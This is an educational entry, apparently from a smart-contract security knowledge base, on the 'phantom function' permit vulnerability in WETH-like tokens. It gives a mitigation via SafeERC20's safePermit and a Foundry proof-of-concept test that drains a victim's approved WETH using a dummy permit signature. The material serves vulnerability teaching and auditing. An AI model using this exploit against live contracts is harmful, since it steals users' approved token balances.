# Phantom function - Permit Function

**Name:** Phantom function - Permit Function

**Description:** Phantom function: Accepts any call to a function that it doesn't actually define, without reverting. key: 1.Token that does not support EIP-2612 permit. 2.Token has a fallback function. For example: WETH.

**Mitigation:**

Use SafeERC20's safePermit - Revert on invalid signature. https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#LL89C14-L89C24

**REF:**

https://twitter.com/1nf0s3cpt/status/1671347058568237057

https://media.dedaub.com/phantom-functions-and-the-billion-dollar-no-op-c56f062ae49f

**WETH9 Contract:**

```jsx
contract WETH9 {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public decimals = 18;

    event Approval(address indexed src, address indexed guy, uint wad);
    event Transfer(address indexed src, address indexed dst, uint wad);
    event Deposit(address indexed dst, uint wad);
    event Withdrawal(address indexed src, uint wad);

    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;

    fallback() external payable {
        deposit();
    }

    receive() external payable {}

    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
}
```

***\*How to Test:\****

forge test --contracts src/test/**phantom-permit.sol** -vvvv

```jsx
// Function to test phantom permit vulnerability
    function testVulnPhantomPermit() public {
        // Alice's address is set as the first address in the virtual machine
        address alice = vm.addr(1);
        
        // Transfers 10 Ether to Alice's account
        vm.deal(address(alice), 10 ether);

        // Initiates a "prank" on Alice's account in the virtual machine
        // It's unclear what this prank does without further context
        vm.startPrank(alice);
        
        // Deposits 10 Ether into WETH9Contract from the current contract
        WETH9Contract.deposit{value: 10 ether}();
        
        // Approves the Vulnerable Permit Contract to spend the maximum possible amount of tokens (WETH in this case) on behalf of this contract
        WETH9Contract.approve(address(VulnPermitContract), type(uint256).max);
        
        // Stops the prank on Alice's account
        vm.stopPrank();
        
        // Logs the balance of this contract in the WETH9Contract
        console.log(
            "start WETH balanceOf this",
            WETH9Contract.balanceOf(address(this))
        );

        // Makes a deposit in the Vulnerable Permit Contract on behalf of Alice using a permit
        // The parameters for v, r, s (27, 0x0, 0x0 here) are part of the ECDSA signature scheme for the permit
        VulnPermitContract.depositWithPermit(
            address(alice),
            1000,
            27,
            0x0,
            0x0
        );
        
        // Gets the balance of the Vulnerable Permit Contract in WETH and logs it
        uint wbal = WETH9Contract.balanceOf(address(VulnPermitContract));
        console.log("WETH balanceOf VulnPermitContract", wbal);

        // Withdraws 1000 tokens from the Vulnerable Permit Contract
        VulnPermitContract.withdraw(1000);

        // Gets the balance of this contract in WETH after the withdrawal and logs it
        wbal = WETH9Contract.balanceOf(address(this));
        console.log("WETH9Contract balanceOf this", wbal);
    }
```

**Red box: drained the pool by phantom function.**

![img](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fccbf77e6-c6ef-4cdd-8065-60cca1e2c4c1%2FUntitled.png?table=block&id=ce845a77-2d19-4e97-9124-e3fc0e8a2525&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)